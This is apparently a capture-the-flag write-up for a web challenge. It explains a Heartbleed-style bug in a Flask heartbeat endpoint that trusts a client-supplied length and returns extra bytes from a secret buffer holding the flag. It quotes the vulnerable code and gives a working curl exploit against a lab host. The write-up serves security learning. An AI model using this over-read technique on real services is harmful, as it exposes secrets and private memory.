# Akemi's Heart — Web
<img width="787" height="333" alt="Screenshot 2025-09-15 120024" src="https://github.com/user-attachments/assets/fce1f475-f0de-404b-8364-76c7ee4a7f4d" />

## TL;DR
The bug was the server trusting whatever `length` you send in JSON.  
Tiny payload + oversized length = secret buffer spill = flag.

<img width="791" height="614" alt="Screenshot 2025-09-15 120250" src="https://github.com/user-attachments/assets/6da94418-e2b9-4f65-a8b2-abf3d54e0dba" />

## Important Code

```python
FLAG_PATH = "/flag.txt"
secret_blob = secrets.token_bytes(512)
if os.path.exists(FLAG_PATH):
    with open(FLAG_PATH, "rb") as f:
        secret_blob += f.read()
else:
    secret_blob += b"GCTF25{fake}\n"
```
This builds a buffer of 512 random bytes followed by the contents of /flag.txt (the real flag).

```python
@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    """
    Vulnerable heartbeat-like endpoint.
    Expects JSON: {"payload": "...", "length": <int>}
    """
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            raise ValueError("bad input")

        payload = data.get("payload", "")
        length = int(data.get("length", 0))

        if isinstance(payload, str):
            payload_bytes = payload.encode("utf-8", errors="ignore")
        else:
            payload_bytes = bytes(payload)

        extra_needed = length - len(payload_bytes)
        if extra_needed <= 0:
            resp = payload_bytes[:length]
        else:
            resp = payload_bytes + secret_blob[:extra_needed]

        r = make_response(resp)
        r.headers["Content-Type"] = "application/octet-stream"
        return r

    except Exception:
        return "💔 Ouch. My heart keeps bleeding", 400

```

Here’s the bug: the server blindly trusts length. If you ask for 8192 bytes but only send an empty string, it fills the rest with data from secret_blob. That means random junk plus the flag.

## Thought Process
The zip had `app.py`, and a quick look showed `/heartbeat` using `{"payload": "...", "length": <int>}`.  
The code did `extra_needed = length - len(payload)` and filled the gap with `secret_blob`.  
So I tried sending an empty payload with a huge length. At first the response was messy random bytes,  
but after filtering for `flag/CTF`, the actual flag appeared right after the junk.

## Exploit command
```bash
# oversize request, Windows CMD with findstr
curl -s http://host:port/heartbeat -H "Content-Type: application/json" -d "{\"payload\":\"\",\"length\":8192}" | findstr /i "flag CTF GCTF"
```

## Flag found
<img width="940" height="64" alt="image" src="https://github.com/user-attachments/assets/6da68724-4552-48c5-ba79-3729fb43ac6b" />

